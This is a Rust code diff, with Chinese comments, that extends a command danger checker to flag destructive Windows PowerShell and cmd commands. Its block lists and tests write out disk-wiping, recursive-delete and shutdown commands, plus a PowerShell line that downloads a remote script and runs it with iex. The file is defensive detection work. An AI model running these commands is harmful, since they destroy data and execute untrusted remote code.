@@ -43,6 +43,29 @@ const DANGEROUS_PROGRAMS: &[(&str, &str)] = &[
     ("truncate", "截断文件"),
 ];
 
+/// PowerShell / cmd 里的破坏性命令（按小写比对，Windows 命令大小写不敏感）。
+const WINDOWS_PROGRAMS: &[(&str, &str)] = &[
+    ("remove-item", "PowerShell 删除文件 / 目录"),
+    ("ri", "PowerShell 删除（Remove-Item 别名）"),
+    ("del", "cmd / PowerShell 删除文件"),
+    ("erase", "cmd 删除文件"),
+    ("rd", "cmd 删除目录"),
+    ("format", "格式化磁盘"),
+    ("format-volume", "PowerShell 格式化卷"),
+    ("clear-disk", "PowerShell 清空磁盘"),
+    ("remove-partition", "PowerShell 删除分区"),
+    ("diskpart", "磁盘分区工具"),
+    ("stop-computer", "关机"),
+    ("restart-computer", "重启"),
+    ("stop-process", "PowerShell 终止进程"),
+    ("taskkill", "终止进程"),
+    ("remove-itemproperty", "删除注册表项 / 属性"),
+    ("set-executionpolicy", "改动脚本执行策略"),
+    ("move-item", "PowerShell 移动 / 覆盖文件"),
+    ("set-content", "PowerShell 覆盖写文件"),
+    ("clear-content", "PowerShell 清空文件"),
+];
+
 /// 命中即判危险的子串（命令行里任意位置出现）。
 const DANGEROUS_SUBSTRINGS: &[(&str, &str)] = &[
     ("rm -rf", "递归强制删除"),
@@ -56,6 +79,19 @@ const DANGEROUS_SUBSTRINGS: &[(&str, &str)] = &[
     ("drop database", "删除数据库"),
     ("drop table", "删除数据表"),
     ("truncate table", "清空数据表"),
+    ("rd /s", "cmd 递归删除目录"),
+    ("rmdir /s", "cmd 递归删除目录"),
+    ("del /s", "cmd 递归删除"),
+    ("del /q", "cmd 静默删除"),
+    ("reg delete", "删除注册表项"),
+    ("-recurse", "PowerShell 递归操作"),
+    ("| remove-item", "管道交给 Remove-Item 删除"),
+    ("format-volume", "PowerShell 格式化卷"),
+    ("restart-computer", "重启"),
+    ("stop-computer", "关机"),
+    ("downloadstring", "下载并执行脚本"),
+    ("invoke-expression", "动态执行字符串里的命令"),
+    ("| iex", "管道交给 Invoke-Expression 执行"),
 ];
 
 /// 评估一条命令的危险性。
@@ -76,6 +112,14 @@ pub fn assess(cmd: &str) -> RiskAssessment {
     let prog = effective_program(trimmed);
     for (name, why) in DANGEROUS_PROGRAMS {
         if prog == *name {
+            reasons.push(format!("{name}：{why}"));
+            break;
+        }
+    }
+
+    let prog_lower = prog.to_lowercase();
+    for (name, why) in WINDOWS_PROGRAMS {
+        if prog_lower == *name {
             reasons.push(format!("{name}：{why}"));
             break;
         }
@@ -328,5 +372,27 @@ mod tests {
         assert!(a.dangerous);
         assert!(!a.reasons.is_empty());
         assert!(a.reasons.iter().all(|r| !r.is_empty()));
+    }
+
+    #[test]
+    fn powershell_and_cmd_destructive_verbs_are_dangerous() {
+        for c in [
+            "Remove-Item -Recurse -Force C:\\x",
+            "remove-item foo.txt",
+            "ri -r foo",
+            "rd /s /q C:\\x",
+            "del /s /q *.log",
+            "Format-Volume -DriveLetter D",
+            "Stop-Computer -Force",
+            "Restart-Computer",
+            "Get-ChildItem | Remove-Item",
+            "taskkill /f /im foo.exe",
+            "iex (New-Object Net.WebClient).DownloadString('http://x/y.ps1')",
+        ] {
+            assert!(is_dangerous(c), "{c} 应判危险");
+        }
+        for c in ["dir", "Get-ChildItem", "cd C:\\Users", "type foo.txt", "Get-Process"] {
+            assert!(!is_dangerous(c), "{c} 不该被判危险");
+        }
     }
 }
